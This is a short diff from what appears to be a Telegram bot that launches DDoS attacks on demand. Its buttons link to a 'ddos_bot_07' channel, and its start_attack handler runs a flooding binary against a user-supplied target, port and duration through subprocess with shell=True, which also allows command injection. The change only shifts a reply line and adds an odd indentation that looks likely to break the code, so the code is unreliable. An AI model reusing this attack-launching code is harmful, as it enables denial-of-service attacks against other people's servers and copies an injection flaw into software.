@@ -272,8 +272,8 @@ def start_attack(message):
         telebot.types.InlineKeyboardButton('Updates', url='https://t.me/ddos_bot_07'),
         telebot.types.InlineKeyboardButton('SUPPORT', url='https://t.me/ddos_bot_07')  
     )
-
-    bot.reply_to(message, response, reply_markup=keyboard)
+     bot.reply_to(message, response, reply_markup=keyboard)
+    
     try:
         ongoing_attacks[attack_id] = subprocess.Popen(f"./{bgmi_file} {target} {port} {duration} 200", shell=True)
         time.sleep(5)
